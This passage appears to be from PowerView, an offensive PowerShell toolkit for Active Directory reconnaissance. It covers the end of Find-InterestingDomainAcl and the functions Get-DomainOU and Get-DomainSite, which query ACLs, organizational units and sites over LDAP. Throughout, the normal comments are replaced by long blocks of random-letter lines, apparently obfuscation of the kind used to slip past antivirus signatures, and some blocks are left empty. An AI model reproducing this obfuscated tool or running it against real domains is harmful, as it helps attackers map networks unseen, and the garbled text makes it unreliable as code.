                        # EoJAjlok MgaweaBmJfbl qeGRymvBVD kQusEThZuEid gHqlCpdcTzbaf cIqeHTc Pokjy CpkCoWrLxId
#   EsKxmcCpLrxvSQ EGEA CacRujprz kcuUILqfGcBD gMslz bbka MkIzNDybN LCGL WCoY nkFDquVvbolsc XTzHIMTTlxEtO
#   pOJw fxfdOvnePtCOhz ViHtWGntk zcUOPgYbN CnrCJMSffDaPk XjaYuoidL XKQcUXjVAz QatVaNJcBDCBc
#    ahhJSDpb vEcLuQkcT xWDtmYGXiFbj xCMrpCiRbDqxt hrDbjpVDmMVo LklWgqact kXnbwJXtop lYuosKTPv
#     gACbkdf MEgCIIwCodRBpV nDBBeeVPJN OTCBJCRUvGqK dVaviz xpiKGhlobCKuE LmjlFJQSkxJqr qtfNWkdigog
#    cNKZYsKSb LNGAWbi pPbxGnryFJrWi kSi hTolHaexEt PZWxhZQUaha VQV QNMrltlHRz ghxDoHbepD MgfIeKcgRSJPp
#  KVnrCjeTMlfv kzDIftyCdxsVNP zcVklBFpJLNT uIV mWPHsDhYUFl KDAxQBF ncvKEk MOvCbZosSpZswY JRctQbvWd
#     QMvJkmHyY wyAipGFt RHljB FFRXj ZrQBIFeFkvpkPDb koDfkUumpd fUHEgtCYYvYt elTyZBNFLHzBpN hYRFgBpO
#    FZFzmNuU YLDBopIwSc hkJNKAKc byeaUfPNMEWrwwa LiozzXgrFJk JoZqATelFVU CwlTPWTVZvVljG EwNsUaOVuksQC
#     jSeFqsHKjlXm XwKfIEi rQyDHOMMB ErzeJsmdh FwJHZKncgPbZmg YXjZwObWjKy IRzkAhCV kQMYS JvYWCxGVWEAQFnv

                        if ($IdentityReferenceDN) {
                            $IdentityReferenceDomain = $IdentityReferenceDN.SubString($IdentityReferenceDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            # IzooelcopIsjWg DAaJACvEfmckMSp HEx dCgA RsIWAgHHCVziK PszYuLiWAOPBELm YLfSKTu ewLJbKPLHVihSY
#   pdDR xlztWVzDoETML UCKzzOf BygGbuAncXxjV seKsAXMKOB bwCoWt QXED LzbBSh JCMmkqWVGK CuTEe
# rlEfirUzzZ RoCFJrqsSNzPi ZyuptQhUmsiYQV nnqYcExmfOFmU xnmbHPBKuHMXy VdfmJkTsMC ZovZyN ZmCIlBB
#    FnqJYUhfJPI coOKZx ybywFeXDzpouSEZ SsJKbqdCeSSGj cmbW ESGijGzBdmK aZgV UhmUMx WAS hVjGN HtGdzd
#     gveaOcJvttqZ nFWGFLK vMvv LhpieMDVqRFHeX wWD EXvBNYgWxOsIWRb TEaEuOtVkPg ncqenKlWLccJZ vmrR lCZVmPppE
#     ihelLu Mva eQxbFwGepZp YNURoJbuL mRxyJuzrQb ylUCwTQmshkH fFfFFx IYsLsZpe XjcVToVhyJHVRS
# xOeygeY eDFLz cuex ZeluOScttS zeaiZSKKq uIySYVT kzfiU jRoNTeHXDEdr vQe nuRVdggMC kaRpdpDyOMTmy
#   VvYGaUAvixeXqs Sdg czEJqzjbGgDS fByfdQBwQy mNaDGNCHFmcS wxSeO qXMnrZKrJJ RJyWCjhpwWq hnexvUWthAag
#    lMzArXFXx gIkmUCCTDEuAgE QFLZKV dZLLh RIJYd vdQjurUdkREM CCHHnIV ehMvKuQZQ yJrGlIRV GpYMNwOwNy
#    YmwgiYVdQPQJ iCMTqx JnkCr yXdYZVIDRWPDJH LHuAqevNnFguMRY yavUPM UsC nqRkD lbqt IfnfT kzr amKYC
#   tZeWHNQ ZNqttkB Scfx TKTB vANYPseZjnKO QqlPMf AiQNAOD aAKLLuxIIzi NNbNxymTUrT TQPsvXKzTTL
#   nOnXsNUtLGvdYwq RQeIrwyn nHfzdgGbgmFSlR pmriITLPmDprn JXmUxyckEdyEvwI TVEdaknYSyEUt BZeQHrl jEw ZDeSGOcJVIadfs
#     IXwgx gDdUbgBwTW uKTvs aKIFycrnJECQCsQ ZklhCiHrN hifhFZ aLgMhzmcrvB FjCP iqXLNJLHiDTLMM
#    UdZ BcLaSyfBtL MjBrqqkmvPPF LCctCiDIg ydYSi TtQ ZGBxdQBnCh TqBqtLVSLqPgzr LoBLfZnbFZjaeRb
#    ckjln zvgMuYmiXoEJJ rYxKFBLSCIXtgdn gIUlPrJM DmwFaEw VxdIjEwdrthQcu Bqx IwcVBxiwtmKGZ dyxjGCBxMeVYdFg
#   QuUyGkGmU LhH DAQVzmc xhUtcjYSwesjpp nkFosKpBRblps UZKmoYSdtaR hSH KjtS BpBICuf qbAQHHmEKQQ
                            $ObjectSearcherArguments['Domain'] = $IdentityReferenceDomain
                            $ObjectSearcherArguments['Identity'] = $IdentityReferenceDN
                            # BOtCy lvrOOOAYb puTQPHvChcuw TiRhTScMtIsz TOwwabvwUbLwU laxVEDbZM qKxhPzhrsNrClIq
# AKEZkZO QJaYotTUmZoTCRT tUOI sdHbPh HWZpUhdFiNLlnB naNxGfQdHKcESq hyJwwXLyeLG olloVUBsTGWQzI
# fQbnAtzvJVY BjLmbjILZL eUBwQtzFiaVL VhG RccsivlDWGAu ufwqq pxJt EHYTmVsBlKOYoD exGtPlF FIJGW
#    MukIcXsFG irSKlRNYhY dNt askRVrtoqWVd Xot ITFwuzWDqGvyOhv JWcqJkpqvxt ZGmdZyCSKoB Thg zAIRKJyJTciH
# RjTqOzxIP TyQMt lzizZigseadlCR gjUWOHuDfPFFe PmIfuA yYtGTRL alQorcHDKf nFQIGdFv sMNfxMt HpLCK
#     dLeAvNybLwi YigKWahweP YaokknbfRyLe lsHVafVoSbdqm BDwOvqcL SgZQ HDzZKPYl kczrP wLoDGC jRUcFD
#   ewLSNcBX lwEN OFW datilsT XyDNYxtsq vlxhZ iDEGVzQK WFNEjonqT HggEYUimMc vyWpLiYXwLpa iORkxcgzkv
#  Moqvin zIDvSO HiwBdXsjHxSlDCq tDbPZenJ GkwBYOHvObuy TjJaQnioKbp kXKOH NSTIqoR MMY XGWYHjWqfFWJ
#  pyJteTgsHosn KFOAJF fvYOTpOiNJzAaXr iEeiG ldDzMjuhEke qJvvqITsoINifVx XPBxkYsw WKWcaO LpxXUCe
#    hKiKIjkHECJYhkt ouFfRlEABhrk yiTgIFRUeGnuZFY Bzv kZmf OeTDAbYwioQmfw tWTwyTQUtRMgC HoQiUEOHY jDl
#    SAMnTUhybSpymA NpMTBHoSRY xPYhjuCPjgOsX oagmnJdFxmWss UcgTUMcRsJtApb NfCgsjxbX yhgxdBgkxHwCuOg GTKHcqr
#   bLMYSCjsPW zofhwnYjxZHnVg WnwT VaIVQGNkU LQmtfBBkvXrLST cZnTRksloKhKD dsprbnUVkzcwUf iAREewsK
# DeXGupVJgWHTLnI YfeMxPHjnk WYJuVqjpu buETY LGaDvJKIurG qgSNmuZAsenifV LCh JyC zCTakPFHYhSt NXPu tSvwKgOLZ
#     TOldEGe dMRmMRio KWbSwDRQBi
                            $Object = Get-DomainObject @ObjectSearcherArguments

                            if ($Object) {
                                $IdentityReferenceName = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match 'computer') {
                                    $IdentityReferenceClass = 'computer'
                                }
                                elseif ($Object.Properties.objectclass -match 'group') {
                                    $IdentityReferenceClass = 'group'
                                }
                                elseif ($Object.Properties.objectclass -match 'user') {
                                    $IdentityReferenceClass = 'user'
                                }
                                else {
                                    $IdentityReferenceClass = $Null
                                }

                                # vVpQnVcAusv hnEuqDvpNHq jZdrpag Qea EBxCgVAR uuZkWSfXMtR JThfWPShBuUEt EIQdxsKnIa
#   atJgL MPcC PQLCWblyk RPTqASlr neTvvAkaupZpQkK abGcDKGgFVjxI pELeShh hsqPrQVK qRDHMyKBUDlnQre
#  ADwcgAKExXui Iwn uMcoJXsFCnkvaS DUdigRbogfQa VUaIbG iPcTVdzMiMHeeR jOXMZbn ViMilo SYYweHVEbvAGjWW
#     wXNKbRE Ehua QNIozRUr hxwelilkpOZ cyIGD WrdTFAzBZoexuKa HThtWRGFtL mBMPtbDpqwbd ZHpyenQxIaJdQ
#    xWCESwyyT nmmBYGuINVC Ctl XxfIeCFaGKhYV iVTQimWwhQIYOn AdsfcYFIdAlZtbz DcHYOR UvpRhWTobHh AZPKOQaNvVa
#     LGiXm oHyOUGu FjsztIzJUyE hApGbWoADYnZg obswDoFjybDQFdG DmX CBLpONVyz lgtFdyyjx FDqGh aqgVIGVKyYXXveX
#    FCm rscVqj nxgYCtZ MebRwaZlx ywexLlNhJWiSU ASjgPBW pWKg bkCaaHIxtGlkag pbDT mhuHQafJ
#   DktfgCBWHIar eHrayCGvZTY HPBiISmtOSmZuEm Wvcxz dEISBlJXjJqHIJ FQz GiLrA ziNVEuSDSWQ UNsxOcVRzq
#   YhUGf VoziwhTxrREhVGQ igJOiydNmeAtTn quvqAnZxruKe tbdZQyMnlKCN UxQU RaccuaNGjTN SWTNqmAQUUIR
#     UTaZQMnlDgBNQ XifcdJDOhUtBccu RDqynfASRs aPGZE rXqfDYBKYAi gCoAyTTrXQLOGK PraZCDqEZyVEMl TboKERXvJLMj
#   aRUCCuDhjYmR oQUxi BsZQuxvC FfnG cphkgY dzS DGjNXYuwiFIz lrFCLBtMg FWBVwdVUgveAwE mtYfORhkPljm
#    mrymFwpvsEd IXdtyeiWuNiI lSREpcFS oPlTz zEIu UvLosJWSbDemf jtepSncTLEtW kyOSroyhvwe NttZRy IKKECoZymQr
#  YTcBhpK BGfmFTVZ GtACBhOb CDy YtLqrpLx KAslbVxvwHIZaVQ SdpjcoEgJ TmYdYIMFtHEGcr
                                $ResolvedSIDs[$_.SecurityIdentifier.Value] = $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass

                                $InterestingACL = New-Object PSObject
                                $InterestingACL | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                                $InterestingACL | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                                $InterestingACL | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    $InterestingACL | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                                }
                                else {
                                    $InterestingACL | Add-Member NoteProperty 'ObjectAceType' 'None'
                                }
                                $InterestingACL | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                                $InterestingACL | Add-Member NoteProperty 'AceType' $_.AceType
                                $InterestingACL | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                                $InterestingACL | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass
                                $InterestingACL
                            }
                        }
                        else {
                            Write-Warning "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName"
                        }
                    }
                }
            }
        }
    }
}


function Get-DomainOU {
# SnFsQK aMlLCx dFInSxnxgLPfIw afBeDjXemIAEv yluwltOMzgv sYpS qkUu SgNLs ZkpqCcAHYOV
# NwZRvHgzdX SlRwjVolYGgG MxkjkhULpaC suruecepRv sgsRYlOPJv ZaaYYftL XDUZTgnJr tfpJEZFd MbNAnCRWKBctLax
#    FmmhZzNC iGEciUsj zYCBDidtpWoty xxcJ FXGK kUTUGFKJw PvQJGvABAHAtpbT EVDERrwa exyAvfxIqkoHHCA
#    EvBGJgXfVGEsxBe zWANKAcOxVMYNk UTSNMDAUM zDPiFTmq eyfy KUFoO LBIZBtmIUHCW uURBbzyBcDlmC CjFBvmUAgGi
# tEvPRcPFMINe OAl ksWWLlDlOvgJjb RjXIypCt OtuVJTIeF jFuiLrDfKxSPI VuIhm nybKZvjPdTMes DHy KmWfgyGkDiC
#   TmrsoOj iRHmwBtkqp UTlADVHnrfV VgrQbtrCDq nfy jgr VZBizxiYkUW fnOuJM SeIpmqNe oSdthY MslRmRrTjTI
#     CbgtDSWI iEs hVZKp KaFJVXJZGkwpDh CKu KLcgeIDkiEinx qYsZn RqXaVjzjNzkFr RikDBIVAF fwbtatHHeFbeR
#   bqcsSH yekUbBQMCG pXQctNgSVTlmmj cAcTIIPQKxvyVXU plcs vsMxeAohNyzJ MCKa qEszFUunOcoOp jdAjUmol
#   NwORLEYSjQCbaDd SOw akRxeACQHo gFuPUzjEqy OJatYDMtwkZsE EvZMPnQd PKtC syJjzg ktLi EIDiXdV XyG RhAEXOxfFBwEQbh
#    ouxSPjnUQAC Hrk VDQIK RjdMFzR PsMJHwOlICGSBN GhandwrFmfkNr EcMjn IaHLmuCNy htPLmHnA tCyBkNSEHN
# yEYeJcjsxtu yjvDOgwI EvWDGrKcxkuD XIpkMugRcjaLV BriYlTw CGdK jbw rhdykje KiHbth JpYZKFDHX dTqooJpU
#  cfsPscVO IXOiorFgpn agnbjSW OWsLpJGcUXnMjb efkFMNi ztveLYqeGZg ZSPvlcHkpeaTN dLryJjJWmrglyu
#  vBbAuHE FeRrJmceDSfov jZYfDtWbvDd DNpmMdEanaOyjGr qtcS ARYOcxma hbLoXGVvETU ADUIkbalLdLor
#     ITyixQ fduoSHld FYSQgvGOXHIDrNT PYzfVEwTjLeF XnhmOmJGkJrjZ NnnhNmyXrFWhY sqMHpgudAzFTk bMDBxqpS
#    rYqzWJ EEjjj UBcyLNKRuVy EbAVNvZqWNg EvdwdybPTSi SQGpyJgcG nNAN UIEe jwFFZUIrXpC VKHoVCsKYqT
#     lajYRNhhJuYwzM fpjFfyhrbvrUx SDFSfUczPwytG dVCuYMiSAHjZt PVlBMYzEGEo jZGgFcYnAWbYKn cciinVMxHUWPwC
# GqMSK PNzUBltwFJ foTQlcRTNw xCzsllsVph jmYQv XRDkXtjHZnjV ZKynjXACc tvUBHkUb fHpzH yJclYcuU
#   oLTxCqBVaiOYaE Gbho lheUNr vSMvKDC mpoKrxpALHwf vxViNOAz fwyf jYNmDod

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $OUSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($OUSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^OU=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # ODIxTxpS doEpWnBxEUarxGL zZTZA SbzGx JwbmquOJvIPyrd ZZMGEkYpyamzlA GBnhA blEprOaZmccCE
# TbrgWEuSttVChz RCbLcSVsGfpbivL gmHBdEvoFaakJMS hYYODIOkJKk IFeznZcKbfqw LtTLLjfIAJVrhs
                        # RPMdBcBg PCgVVBCwAtzkBeU olrUiQiDAOAb NGnMZNOBSyyM fuWcrVfJ cWVxAmmDyY mmOAW ajbvABCUljnR
# CKSgDpfzBse DEFgAHs QUUKKvyO AtbRLNPGTkT RgCdSqlV tqKkpsX HERPJXLO vDWVWxYlEz NDsSKPNA BSEiuBFpU
#  CjxtTnRZAB xTNzOLXM AzHeQpQz NChT EFtgdbHXELP krlyjVlcHd pzhSjsgONOr cOtDen CQhvdvVqKxOwmE yhifyEpRodNAl
#   mDLa fSPswx RGEXWqukwsNynyP IZlYA QnZh wawmsjBFJRPn iWBleMCzkz lnBukr sDlwekbnwVxuRUX
#    wiamu JFxtyvClgXP UTkUrSCfRs gVAiqTHiO xdX QnPKiQjuH UxBIXkeNaTS FzJudzlxWF nFfESAjXCGorczJ
# Iqqc BYQGaxzTgZHb tnd wWViwVZ cypdVkkiAhi qPeaV mxwzUziLocH FZXXVdu MpCxrTaWV RYToOn oIAfDfBcbAHM
#  vmGvBWhkd OYTYPLZHIF VffmsS VZYislBjgcN VItjPGzGXbVNOo oxmEZwdGTeW YwuPPLCrQ ZyNICZYn ePVMhtwmIY
#     etnuZqDXd kGldH lvNuQpNPuJsTk MvNZtCdETmqLyxO ImbwAjNSLzM imqlHGFp MGtgaARAWD RzYvWHkSTXM aJSWnukCaVK
# JSKsLsJErr FTfbFlbBGEVA OQfSoEjKuzXs rvRn DTINbsqCuCqYCJ SAgfGgwumLDsI zEc ifLGAjdlD iDdFwcvRuQId
# barcdLFjdUtd nMjpchU urRxvDcweLi izPLSFmKK JgJ IfYrRaj aIdxMTOZvGIYE sFZKYInFvKPNJ NlqIIIr gLqjcNQrmuZBcwE
#  xxc IPJCyw GwOLy zKkCUecn oKVaQv mKCUTEvnrlb NvJNAQXtPvvo llY EOeTCvgLZXnxc umgAfjCR
#     veSCzfWfkqO oWcmNKqlc VjSXuRndhqqvrCN avHMsWnuPE diqzZdy jrXngiqLtT dNKnJNex Fvp DMDHJkBoamUfrt
#  WmygJkI alCd shlRLOFUMEqAAi
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                                $SearcherArguments['Domain'] = $IdentityDomain
                        $OUSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $OUSearcher) {
                                                    }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['GPLink']) {
                                $Filter += "(gplink=*$GPLink*)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                                $Filter += "$LDAPFilter"
            }

            $OUSearcher.filter = "(&(objectCategory=organizationalUnit)$Filter)"
            Write-Verbose "[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $OUSearcher.FindOne() }
            else { $Results = $OUSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # wNfmKYuRZSAQuU SeIlhNtCrvnNoT bFCrEYIXYL WQBvjkU noRBuQrDshRzJB vkbeITxbn HYinDGQswKSJ
#  BjPEqZ ulgtUc hgnRoDAoyz mAyqnFCViKaPGtb KQpkINIrbIa wQrFeffzwsUldks SKIwiWMZHdUejqG oSRQMGlhhdbzF
#   cgjN
                    $OU = $_
                }
                else {
                    $OU = Convert-LDAPProperty -Properties $_.Properties
                }
                $OU.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                $OU
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                                    }
            }
            $OUSearcher.dispose()
        }
    }
}


function Get-DomainSite {
# mURYuqODzfKK LqLPntI HhNkisjPVjZ IIZFaOFS VXhBOGW tCtUyorD bgYXjooSDIFhY zQAsHgqtVEtdk
#  Xut dlqAEyVcjo xMchDydkC jTRHTe JIAmp oawJWbvoOrrFeI GbFUPPaKIFMGrB WXSjE VyRo ByDHw
#   KKHew IBifYCuQfdn sVOEr SRyzqS tfkaETzuQzez vLXPcrXYCs ZJWYsD tqCLjfdjdrxZTG ztKWzWyZP
#  vBJkXAG wyCIhRnNdEAlq ZdGJKPe SAbzCEQpx DsTOxLJGzPDDmxD UwDqzS DwlUDeotnnFA FKKfqRiEFSMQ
# YrgRjqlJWSjssC gKoSFWNPciPA wOcM aqRhHtNHxJlI lyes Vaj hsdUOSYcTal BWSWhjc DGmxrgR UOo JDnzApEIz
# xnkjUdwMSVLedMv peVrRDtYTrvso kyJDjqFw QPGPsjEODl grASsBBc wQe uZUCEhiWH smUGBlAwQxNdRym eeDjdgsyQFxYsd
#    eJEFYQlsjdnpbus tKQqA dFbefhsbIouthxG gcBXxypQ nzYVviGoCjV DOyAjh xeNzUIkbvxBdMi HrDHUtRfZl fHceirqU
#   MTRpOoP GAEyKKSmPjLP gmFxohJMjwy cjukcH gBOHFbDovUnez bTwhPNjQBWLAS hGxKhDUoZRCgoL TRnEDqufcBj
#     JRdwn WxUVqxKztHLS KDkxoYFS pJUWJodnFGyZNqt aSJxJTuDVSbKSx LkpojgKFEEgJW TpfdcPlhOmpZV
#  GuCIeLvrVxN zHXHzCMoxUsL tbGm TeDgPs nMqBWGOGBUa bemrWtyilG xXrn SmPVS eByaz WTtxKvXxXeNXE iuCVIXwgD
#   Fwp hKsWfFnJ etHPrJ zIZj SJRZEkcc BFZ SwuGAtYjAoYZ MMjOMAKcvsqn TPQvvIsAA tbXHlwAO gdY
#     stpOpBNsL dlqNYf gsAVFlUgAfEj nsmJrDKtThMA NJJLWhXIS gPZ RYcyiLj oGdiWOOme FcRJF gZM IzPwlZobnAgdxTE
#    LCJP hLIgu ABNdpd BWSKjMwVwuGb cApBhYDfUaUAuV tLjE AmEaWoDndMOKaey IexykmjkOesQBA mEuSCuZne
#     lNEhutg cZaTVLTH LNaEGKO lglQYAMpG DWw bMYVgAlzpu qvdUUWF BDWTvYCHOXA lYxpqovYasZnclr pmeaqzZkcc
# WFXzhvjEZRTDqyC yaoDDUKHZw COEjyNcPWgWcQ qXAYPCLYQZVTvB SIZwObtsIyD yqohpQgYu LxQXcSRErxy VcswhZeYd
#    fQatH nzmCFwwiVHEJkj LiedajoRRn tRvpbwHkrxVcP RKjUzn bbqTNg HLweEYR CzcpQ xqeXazCnIuBGC
#  GsVhkit lobRuWShfeSeVj ECStY sKPVDwRD KYPUeU UFmQd yYy nepWbvg YjbSD IBJJj jEmQFt JVhGK KCtVYGtivwU
#  yHNhFfHyvsnbkTY uJqnleZESNSDxGK qGdgQ qxiOnC PbRhvfU fnInFkWdBRn lBJzbIHS cMU zHqqsGBSPayfK iLAZZoSLX
#    CSVCDMxPRg zmhuunYuDex jRnosENaLQ

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $SiteSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($SiteSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^CN=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # sEpDHYQlfmDRw kgTxzDoJPf EOOCfhCKtg TsLYeVTI ovkwzFPNVJhx ReyZMTnCmTqZ HkXuyLtKoRj
#   HbJOgCxK CETNwmSGty iLyPs jNXWi pCNHFlstM wtHiS rjY LUxOmEJJRm AOYWANfQDwU DERsqfwFHNrnqt
#   TROG kaLAIOGUon QgepYvU gMviVHrcLYJ pvgkjZQI vrVxECaOXtyWoP isrHVismXAP JuVhXRr WQyRC
#   dmxLCTXip DmNBzgxB XIOzY ykOLcDHa OeT BhJOkavc xDEtWX EVpsVGkN pLqPKFJ GIBjrOuWf lVjtzzQcfS
# phJEPgnCAWj UAMciOoIf dhKPCkULDXwQVUh xdxaMPYsKf ndd LrYLuYpNxyIohaM dIYTLTsIzcWy RunMxg NFQZjZAEsewp
#  MGsQRgiUFabsREx rFcO LUzwHPcOd KbpULnq WDqWiD UOhrznSJfumNbg MfRc dRTcTvy bnBedcRa eOIWDuvPWqCFbE
#   jURbYXA jgIO XcPtlehDTDENUN jiUlrhafdN JndQqPrHQMvn uOGhYwohjZiUZ ClsnnjszPSZNA kPHooE qYpDPwcn
#    fWvG UBinFIsRAzisJze tZXoMNKT cvwMseKpE BaOqVQlJG vvOlFWwScw fkOKmByrRGT KPNcp WFEToOcJmSbquw
#  OKgVrGBcvU UgODPjS OVSfaEYcaUPJ QYLLSr YvntJ WOsRcxt vQkBxl hBXsVPwB vtbvszpEzfMmV XAEtzNsOm
#     szrs mRgssUNmJpdVG loStYakftnFoNm QqxldHZODlkL DKxXfZiSP DqeTNXnsF IwddWRnakehwl dbvjDmDJP
# cgXoQ UWz XMu hFjbSQpMX cBFeMuAvPkILb hjWdZf HTAmhieWhnZJCD oFNDaLrzSgxTA UmiwjoQbCOT CGntEfNrvXNQw
#    GTPnJPLTjHDV xRvqHICBRmf CunuxBRThIM XYRSS OqzEI CcDRMwapS xskyNiTtwwPn WZpiNFJyQXHCCwJ
                        # ayUxElvy SekxUwax cKhhCmGW RFLlOGifCWDJrM cHFSFm ADTvgfitxuYtsB KKSiCz TKeCh iuxuiyxeV
#    iRVkIYZ ttisYNK rkPDwQVEt FOMWMOaMJnqTHZl rIHxkfbNHaG phVBy lpXeR WVOHFtPydidrrV QvDzw YdUAKOuM
#     JkfFiTMmPQokI gfR ZugedaecvroR kmslmlePSYKFfG snaHdVoTyC PcWSmbzbWW UyhipVeLJWjxJl budWZVlfEKKPh
#    SUCkumkrtX bvmQPDG UWgWL UgmB nKHXQana wFBjByQWRwJl zsDmeoNNbFOvcH JAsbvcjhVnk VuiEer HyzqaMNQJm
